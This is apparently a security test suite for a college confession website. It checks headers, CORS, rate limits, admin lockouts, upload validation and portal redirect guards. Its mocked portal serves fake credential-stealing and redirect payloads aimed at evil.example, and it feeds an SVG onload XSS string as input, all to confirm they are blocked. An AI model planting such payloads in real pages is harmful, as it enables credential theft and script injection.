// Real PostgreSQL transactions in a disposable schema; no real Telegram or college traffic.
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { Readable } = require('node:stream');
const { Pool } = require('pg');
const { createTestLoader } = require('./security-test-loader');

async function main() {
  const schema = `security_test_${process.pid}_${Date.now()}`;
  const options = {
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes('localhost')
      ? { rejectUnauthorized: false } : false,
  };
  const setup = new Pool(options);
  const pool = new Pool({ ...options, options: `-c search_path=${schema}` });
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'website-security-'));
  const timers = [], deleted = [], logs = [];
  let server, uploads = 0, failDeletion = false, holdUpload, releaseUpload;
  let portalMode = 'invalid', portalCalls = [], redirectOptions;
  const box = (name, content) => {
    const header = Buffer.alloc(8);
    header.writeUInt32BE(content.length + 8);
    header.write(name, 4);
    return Buffer.concat([header, content]);
  };
  const hdlr = Buffer.alloc(12); hdlr.write('vide', 8);
  const mp4 = Buffer.concat([box('ftyp', Buffer.from('isom\0\0\0\0isom')), box('moov', box('trak', box('mdia', box('hdlr', hdlr))))]);
  const transport = {
    async post(url, form) {
      if (url.endsWith('/deleteMessage')) {
        deleted.push(form.message_id);
        if (failDeletion) throw new Error('Simulated Telegram failure');
        return { data: { ok: true } };
      }
      assert.ok(url.endsWith('/sendVideo'), 'Only simulated Telegram sends are allowed');
      await new Promise((resolve, reject) => form.on('end', resolve).on('error', reject).on('data', () => {}).resume());
      uploads++;
      if (holdUpload) await holdUpload;
      return { data: { ok: true, result: { message_id: 1000 + uploads, video: { file_id: `video-${uploads}` } } } };
    },
    async get(url) {
      if (url.endsWith('/getFile')) return { data: { ok: true, result: { file_path: 'test.mp4' } } };
      assert.ok(url.startsWith('https://api.telegram.org/file/'));
      return { status: 200, headers: {}, data: Readable.from(mp4) };
    },
    create(config) {
      redirectOptions = config;
      return {
        async get(url) {
          portalCalls.push(url);
          if (url.endsWith('/TKRCET/')) return { data: `<form action="${portalMode === 'bad-form' ? 'http://evil.example/steal' : 'login.php'}"><input name="user"><input type="password" name="password"></form>` };
          if (url.endsWith('StudentInformationForStudent.php')) return { data: '<body>Roll No: TEST0001</body>' };
          return { data: '<frameset><frame></frameset>' };
        },
        async post(url, body) {
          portalCalls.push(url);
          assert.ok(body.includes('user=TEST0001'), 'Roll must be normalized');
          return { data: portalMode === 'redirect' ? '<script>location="http://evil.example/leak"</script>' : 'Invalid Details' };
        },
      };
    },
  };
  try {
    await setup.query(`CREATE SCHEMA "${schema}"`);
    const { load, env } = createTestLoader({ pool, axios: transport, directory, timers, logs });
    const chat = load('chat.js'), reyi = load('reyi.js');
    await chat.initDb(); await reyi.initReyiDb();
    const approved = (await pool.query(`INSERT INTO confessions(text,status) VALUES('security fixture','approved') RETURNING id`)).rows[0].id;
    const night = (await pool.query(`INSERT INTO reyi_posts(post_type,story_text,category,status,expires_at)
      VALUES('story','security fixture','Heartache','approved',NOW()+INTERVAL '1 day') RETURNING id`)).rows[0].id;
    const before = (await pool.query('SELECT * FROM reyi_posts WHERE id=$1', [night])).rows[0];
    await chat.initDb(); await reyi.initReyiDb();
    assert.deepEqual((await pool.query('SELECT * FROM reyi_posts WHERE id=$1', [night])).rows[0], before, 'Startup must not rewrite data');
    const { app } = load('server.js');
    server = await new Promise(resolve => { const s = app.listen(0, '127.0.0.1', () => resolve(s)); });
    const base = `http://127.0.0.1:${server.address().port}`;
    const ipHeader = ip => ({ 'X-Forwarded-For': ip });
    const admin = { 'x-admin-password': env.ADMIN_PASSWORD };
    async function request(url, { ip = '10.1.0.1', headers = {}, ...opts } = {}) {
      const response = await fetch(base + url, { ...opts, headers: { ...ipHeader(ip), ...headers } });
      const text = await response.text();
      let body; try { body = JSON.parse(text); } catch { body = text; }
      return { status: response.status, headers: response.headers, body };
    }
    const json = (body, opts = {}) => ({ ...opts, method: 'POST', body: JSON.stringify(body), headers: { 'Content-Type': 'application/json', ...opts.headers } });
    const postForm = (night = false, video = null) => {
      const form = new FormData();
      if (night) {
        form.set('post_type', video ? 'video' : 'story'); form.set('category', 'Heartache'); form.set('story_text', 'A story');
      } else { form.set('text', 'A post'); form.set('mood', 'Heartache'); }
      if (video) form.set('video', new Blob([video], { type: 'video/mp4' }), 'video.mp4');
      return form;
    };
    // Headers, CORS, sanitized errors and login validation/rate limit.
    let r = await request('/');
    assert.equal(r.status, 200);
    const csp = r.headers.get('content-security-policy');
    for (const rule of ["frame-ancestors 'none'", "script-src-attr 'unsafe-inline'", 'https://fonts.googleapis.com', 'https://tkrcet.in']) assert.ok(csp.includes(rule));
    assert.equal(r.headers.get('x-frame-options'), 'DENY');
    assert.equal((await request('/', { headers: { Origin: 'https://bad.example' } })).status, 403);
    assert.equal((await request('/', { headers: { Origin: 'https://allowed.example' } })).headers.get('access-control-allow-origin'), 'https://allowed.example');
    assert.equal((await request('/', { headers: { Origin: base } })).status, 200);
    r = await request('/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{bad' });
    assert.equal(r.status, 400); assert.equal(r.body.message, 'Something went wrong.');
    for (let i = 0; i < 5; i++) assert.equal((await request('/login', json({ rollNumber: '<script>' }, { ip: '10.2.0.1' }))).status, 400);
    assert.equal((await request('/login', json({ rollNumber: '<script>' }, { ip: '10.2.0.1' }))).status, 429);
    assert.equal(portalCalls.length, 0);
    await request('/login', json({ rollNumber: ' test0001 ' }, { ip: '10.2.0.2' }));
    portalMode = 'redirect'; portalCalls = [];
    await request('/login', json({ rollNumber: 'TEST0001' }, { ip: '10.2.0.3' }));
    assert.ok(portalCalls.every(url => !url.includes('evil.example')));
    assert.throws(() => redirectOptions.beforeRedirect({ protocol: 'http:', hostname: 'evil.example', path: '/TKRCET/' }));
    assert.throws(() => redirectOptions.beforeRedirect({ protocol: 'http:', hostname: '103.171.190.44', path: '/outside/' }));
    redirectOptions.beforeRedirect({ protocol: 'http:', hostname: '103.171.190.44', path: '/TKRCET/main.php' });
    portalMode = 'bad-form'; portalCalls = [];
    await request('/login', json({ rollNumber: 'TEST0002' }, { ip: '10.2.0.4' }));
    assert.equal(portalCalls.length, 1, 'Never send credentials to an external form');
    const { BoundedCache, isPortalUrl } = load('attendance-security.js');
    const cache = new BoundedCache();
    for (let i = 0; i < 501; i++) cache.set(i, { at: Date.now(), data: i });
    assert.equal(cache.size, 500); assert.equal(cache.get(0), undefined);
    cache.set('expired', { at: 0 }); cache.prune(); assert.equal(cache.has('expired'), false);
    assert.equal(isPortalUrl('http://103.171.190.44.evil.example/TKRCET/a'), false);
    assert.equal(isPortalUrl('http://103.171.190.44/TKRCET/../secret'), false);
    // All media routes consume the same password lockout as admin login.
    const media = ['/api/chat/image/999999', '/api/chat/stream/missing', '/api/reyi/image/999999', '/api/reyi/stream/missing'];
    for (let n = 0; n < media.length; n++) {
      const ip = `10.3.0.${n + 1}`;
      for (let i = 0; i < 6; i++) assert.notEqual((await request(media[n], { ip })).status, 429, 'Anonymous media is not a password failure');
      for (let i = 0; i < 5; i++) assert.equal((await request(media[n], { ip, headers: { 'x-admin-password': 'wrong' } })).status, 401);
      assert.equal((await request('/api/chat/admin/login', { ip, method: 'POST', headers: admin })).status, 429);
      assert.equal((await request(media[n], { ip, headers: admin })).status, 429);
    }
    const resetIp = '10.3.1.1';
    for (let round = 0; round < 2; round++) {
      for (let i = 0; i < 4; i++) assert.equal((await request('/api/chat/admin/login', { ip: resetIp, method: 'POST', headers: { 'x-admin-password': 'wrong' } })).status, 401);
      assert.equal((await request('/api/chat/admin/login', { ip: resetIp, method: 'POST', headers: admin })).status, 200);
    }
    const security = load('security.js');
    assert.equal(security.isAdminPassword('wrong'), false); assert.equal(security.isAdminPassword(env.ADMIN_PASSWORD), true);
    const saved = env.ADMIN_PASSWORD; delete env.ADMIN_PASSWORD;
    assert.equal(security.isAdminPassword(undefined), false); env.ADMIN_PASSWORD = saved;
    assert.equal(security.getReactorHash({ headers: { cookie: 'reyi_visitor=%zz' } }), null);
    // Signed identity: ignore forged prev, idempotent retries, swaps, removals and concurrency.
    for (const [prefix, id, first, second, table, reactionTable] of [
      ['chat', approved, 'heart', 'fire', 'confessions', 'chat_reactions'],
      ['reyi', night, 'hug', 'healing', 'reyi_posts', 'reyi_reactions'],
    ]) {
      r = await request(`/api/${prefix}/posts/${id}/react`, json({ emoji: first, prev: second }, { ip: '10.4.0.1' }));
      assert.equal(r.status, 200); assert.equal(r.body.emoji, first);
      const setCookie = r.headers.get('set-cookie'); assert.ok(setCookie.includes('HttpOnly'));
      const cookie = setCookie.split(';')[0], headers = { Cookie: cookie };
      const hit = emoji => request(`/api/${prefix}/posts/${id}/react`, json({ emoji, prev: 'made-up-value' }, { ip: '10.4.0.1', headers }));
      await Promise.all(Array.from({ length: 8 }, () => hit(first)));
      assert.equal((await pool.query(`SELECT react_${first} AS n FROM ${table} WHERE id=$1`, [id])).rows[0].n, 1);
      r = await hit(second); assert.equal(r.body.counts[`react_${first}`], 0); assert.equal(r.body.counts[`react_${second}`], 1);
      await hit(null); await hit(null);
      assert.equal((await pool.query(`SELECT react_${second} AS n FROM ${table} WHERE id=$1`, [id])).rows[0].n, 0);
      assert.equal((await pool.query(`SELECT COUNT(*)::int AS n FROM ${reactionTable} WHERE post_id=$1`, [id])).rows[0].n, 0);
      for (let i = 0; i < 30; i++) assert.equal((await request(`/api/${prefix}/posts/${id}/react`, json({ emoji: first }, { ip: '10.4.1.1', headers }))).status, 200);
      assert.equal((await request(`/api/${prefix}/posts/${id}/react`, json({ emoji: first }, { ip: '10.4.1.1', headers }))).status, 429);
    }
    // Failed validation releases reservations; concurrent uploads cannot bypass cooldown.
    for (const prefix of ['chat', 'reyi']) {
      const nightPost = prefix === 'reyi', ip = nightPost ? '10.5.0.1' : '10.5.0.2';
      r = await request(`/api/${prefix}/posts`, { method: 'POST', ip, body: postForm(nightPost, Buffer.from('not a video')) });
      assert.equal(r.status, 400); assert.equal(r.body.message, 'Use a valid MP4 video.');
      assert.equal(uploads, nightPost ? 1 : 0);
      holdUpload = new Promise(resolve => { releaseUpload = resolve; });
      const previousUploads = uploads;
      const pending = request(`/api/${prefix}/posts`, { method: 'POST', ip, body: postForm(nightPost, mp4) });
      for (let i = 0; uploads === previousUploads && i < 100; i++) await new Promise(resolve => setTimeout(resolve, 10));
      assert.equal(uploads, previousUploads + 1);
      const blocked = await request(`/api/${prefix}/posts`, { method: 'POST', ip, body: postForm(nightPost, mp4) });
      assert.equal(blocked.status, 429);
      releaseUpload(); holdUpload = null;
      assert.equal((await pending).status, 200);
      assert.equal((await request(`/api/${prefix}/posts`, { method: 'POST', ip, body: postForm(nightPost) })).status, 429);
    }
    // Telegram IDs persist; DB deletion and cascades succeed even when Telegram fails.
    for (const [prefix, table, fileColumn] of [['chat', 'confessions', 'video_file_id'], ['reyi', 'reyi_posts', 'telegram_file_id']]) {
      const row = (await pool.query(`SELECT * FROM ${table} WHERE ${fileColumn} IS NOT NULL ORDER BY id DESC LIMIT 1`)).rows[0];
      assert.ok(row.telegram_message_id);
      failDeletion = prefix === 'reyi';
      assert.equal((await request(`/api/${prefix}/admin/reject/${row.id}`, { method: 'POST', headers: admin })).status, 200);
      assert.equal((await pool.query(`SELECT id FROM ${table} WHERE id=$1`, [row.id])).rowCount, 0);
      assert.ok(deleted.map(String).includes(String(row.telegram_message_id)));
    }
    // Per-IP public resource ceilings are independent across media and report routes.
    for (const prefix of ['chat', 'reyi']) {
      for (const [suffix, limit, method] of [['image/999999', 120, 'GET'], ['stream/missing', 60, 'GET'], [`posts/${prefix === 'chat' ? approved : night}/report`, 10, 'POST']]) {
        const ip = `10.6.${prefix === 'chat' ? 1 : 2}.${limit}`;
        for (let i = 0; i < limit; i++) assert.notEqual((await request(`/api/${prefix}/${suffix}`, { ip, method })).status, 429);
        assert.equal((await request(`/api/${prefix}/${suffix}`, { ip, method })).status, 429);
      }
    }
    // Test DOM scripts parse, and avatar input is handled only with DOM properties.
    for (const filename of fs.readdirSync(path.resolve(__dirname, '../public')).filter(f => f.endsWith('.html'))) {
      const html = fs.readFileSync(path.resolve(__dirname, '../public', filename), 'utf8');
      for (const script of html.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/gi)) new (require('node:vm').Script)(script[1], { filename });
    }
    const vm = require('node:vm');
    const indexHtml = fs.readFileSync(path.resolve(__dirname, '../public/index.html'), 'utf8');
    const avatarCode = indexHtml.slice(indexHtml.indexOf('  const rollUpper ='), indexHtml.indexOf('  const pct='));
    const avatar = { replaceChildren(image) { this.image = image; } };
    vm.runInNewContext(avatarCode, {
      d: { rollNo: '"><svg onload=alert(1)>', name: "O'Name" },
      initials: () => "O'N",
      document: { getElementById: () => avatar, createElement: () => ({}) },
    });
    assert.equal(avatar.image.src, 'https://tkrcet.in/images/' + encodeURIComponent('"><SVG ONLOAD=ALERT(1)>') + '.webp');
    avatar.image.onerror(); assert.equal(avatar.textContent, "O'N");
    for (const [filename, keys, indent] of [
      ['chat.html', ['heart', 'laugh', 'wow', 'sad', 'fire', 'up'], ''],
      ['reyi.html', ['heartache', 'pleading', 'goosebumps', 'hug', 'healing'], '  '],
    ]) {
      const html = fs.readFileSync(path.resolve(__dirname, '../public', filename), 'utf8');
      const start = html.indexOf('async function react(');
      const end = html.indexOf(`\n${indent}}`, start) + indent.length + 2;
      let selected = keys[0], fail = false;
      const buttons = keys.map(() => ({
        span: { textContent: '4' }, selected: false,
        querySelector() { return this.span; }, classList: { toggle() {} },
      }));
      const container = { dataset: {}, querySelectorAll: () => buttons };
      const counts = Object.fromEntries(keys.map(key => [`react_${key}`, 7]));
      const context = vm.createContext({
        EMOJIS: keys.map(key => [key]), REACTIONS: keys.map(key => [key]),
        getReaction: () => selected, reactionFor: () => selected,
        setReaction: (id, emoji) => { selected = emoji; }, refreshStatus() {},
        fetch: async (url, options) => {
          assert.equal(Object.hasOwn(JSON.parse(options.body), 'prev'), false);
          if (fail) throw new Error('Offline');
          return { ok: true, status: 200, json: async () => ({ success: true, emoji: keys[1], counts }) };
        },
      });
      vm.runInContext(html.slice(start, end), context);
      await context.react(1, keys[0], container);
      assert.equal(selected, keys[1], 'Server-returned emoji wins over the requested toggle');
      assert.ok(buttons.every(button => button.span.textContent === 7 && !button.disabled));
      fail = true;
      await context.react(1, keys[2], container);
      assert.equal(selected, keys[1], 'Failed reactions must not change localStorage');
    }
    const errorHandler = app._router.stack.find(layer => layer.handle.length === 4).handle;
    const errorResponse = { headersSent: false, status(code) { this.code = code; return this; }, json(body) { this.body = body; } };
    errorHandler(new Error('sensitive internal detail'), {}, errorResponse, () => {});
    assert.equal(errorResponse.code, 500);
    assert.deepEqual(JSON.parse(JSON.stringify(errorResponse.body)), { success: false, message: 'Something went wrong.' });
    await require('./test-performance-cases')({ load, pool, request, json, approved, night, admin });
    console.log('PASS: shared lockouts, signed transactional reactions/concurrency, upload reservations, MP4 validation, Telegram deletion/failure, additive migrations, headers/CORS/errors, attendance redirects/cache/input, and public rate limits.');
  } finally {
    for (const timer of timers) clearInterval(timer);
    if (server) { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); }
    await pool.end();
    await setup.query(`DROP SCHEMA IF EXISTS "${schema}" CASCADE`); await setup.end();
    fs.rmSync(directory, { recursive: true, force: true });
  }
}
main().catch(error => { console.error(error); process.exitCode = 1; });
